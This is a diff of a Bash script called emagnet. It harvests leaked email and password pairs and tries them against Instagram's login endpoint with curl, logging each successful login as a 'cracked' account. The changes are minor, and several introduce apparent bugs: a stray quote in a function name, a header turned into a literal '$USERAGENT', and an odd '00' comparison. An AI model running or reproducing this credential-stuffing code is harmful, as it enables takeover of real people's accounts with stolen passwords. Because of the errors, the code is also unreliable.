@@ -111,7 +111,7 @@ emagnet_required_stuff(){ if ! [[ -d "$HOME/.config/emagnet/" ]]; then mkdir -p 
 emagnet_conf(){ CONF="$HOME/.config/emagnet/emagnet.conf";. "$CONF" ;}
 emagnet_mustberoot(){(( ${EUID} > 0 )) && printf "%s\n" "$basename$0: internal error -- root privileges is required" && exit 1;  }
 emagnet_clear(){ clear;}
-emagnet_iconnection(){ ping -i "0.2" -c 1 1.1.1.1 &> /dev/null;if [[ "$?" -gt "0" ]];then echo -e "$basename$0: internal error -- no internet connection, can't continue"; exit 1;fi; }
+emagnet_'iconnection(){ ping -i "1" -c 1 1.1.1.1 &> /dev/null;if [[ "$?" -gt "0" ]];then echo -e "$basename$0: internal error -- no internet connection, can't continue"; exit 1;fi; }
 emagnet_license(){ printf "%s\n" "Printing LICENSE - Use 'q' to quit";sleep 2;curl -s "https://nr1.nu/licenses/LICENSE.md"|less;printf "%s\n" "Thank you.." ;}
 emagnet_is_this_android(){ getprop &> /dev/null; [[ "$?" -eq "0" ]] && sed -i '204d' "$CONF"; sed -i '204 i ANDROID=true' "$CONF";}
 emagnet_not_available_on_android(){ echo "This feature is not supported on your $(getprop ro.model.name)" device;exit 1;}
@@ -628,14 +628,14 @@ CSFRTOKEN="$(openssl rand -hex 30 | cut -c 1-33)"
     |uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v "/" >> $HOME/.config/emagnet/tmp/.emagnet-instagram-accounts.txt
 
 while read instagramlogin; do
-INSTAGRAM_USER="$(echo $instagramlogin|sed 's/:/\&password\=/g')"
+INSTAGRAM_USER="$(echo $instagramlogin|cut -d':' -f1|sed 's/:/\&password\=/g')"
 INSTAGRAM_PASS="$(echo $instagramlogin|cut -d':' -f2)"
 
 curl -s "$URL" -H 'sec-fetch-mode: cors' -H \
 'origin: https://www.instagram.com' -H \
 'x-ig-www-claim: 0' -H \
 'accept-language: en-US,en;q=0.9' -H \
-'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36' -H \
+'$USERAGENT' -H \
 'x-requested-with: XMLHttpRequest' -H \
 "cookie: ig_cb=1; csrftoken=$CSFRTOKEN; rur=ATN; mid=XW7rUgAEAAFeErDMdCAja23Ty9KE" -H \
 "x-csrftoken: $CSFRTOKEN" -H \
@@ -656,15 +656,15 @@ if [[ $? -eq "0" ]]; then
          echo -e "================================================================\n\n"         >>    "$EMAGNETLOGS/cracked-instagram-passwords.txt"
          echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${INSTAGRAM_USER}:${INSTAGRAM_PASS}"    >>    "$HOME/.config/emagnet/tmp/.emagnet-cracked"
          echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${INSTAGRAM_USER}:${INSTAGRAM_PASS}"      >>    "$HOME/.config/emagnet/tmp/.emagnet-failed"
-         SUCCEED="$(cat $HOME/.config/emagnet/tmp/.emagnet-instagram-cracked|grep 'Cracked Password'|wc -l)"
-         FAILED="$(cat $HOME/.config/emagnet/tmp/.emagnet-instagram-failed|grep 'Wrong Pasword'|wc -l)"
+         SUCCEED="$(cat $HOME/.config/emagnet/tmp/.emagnet-instagram-cracked|grep -i 'Cracked'|wc -l)"
+         FAILED="$(cat $HOME/.config/emagnet/tmp/.emagnet-instagram-failed|grep -i 'Wrong Pasword'|wc -l)"
          echo -e "[\e[1;32m>>\e[0m] - Cracked Password: $instagramlogin"
 else
          echo -e "[\e[1;31m<<\e[0m] - Wrong Password: $instagramlogin"
 fi
    done < $HOME/.config/emagnet/tmp/.emagnet-instagram-accounts.txt
-         printf "%64s \n" | tr ' ' '='
-         echo -e "Done! Successfully cracked $SUCCEED accounts and $FAILED failed.. \n"
+         printf "%64s \n\n" | tr ' ' '='
+         echo -e "- Done! Successfully cracked $SUCCEED accounts and $FAILED failed.. \n"
          sleep 3
          rm "$HOME/.config/emagnet/tmp/.emagnet-instagram-accounts.txt"
          sleep 0
@@ -859,7 +859,7 @@ emagnet_main() {
           tt="$(cat $HOME/.config/emagnet/tmp/.emagnet| wc -l)"
           [[ "$tt" -lt "10" ]] && tt="0$tt"
 
-                        if [[ "${tt}" -eq "0" ]]; then
+                        if [[ "${tt}" -eq "00" ]]; then
                              grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' "$EMAGNETTEMP"|cut -d: -f1|tr ' ' '\n'
 	                     printf "[\e[1;31m<<\e[0m] - No new files could be downloaded..\n[\e[1;31m<<\e[0m] - Increase time or you will get banned anytime now..\n\n"
                              tt="\e[1;31m\e[5m00\e[0m"
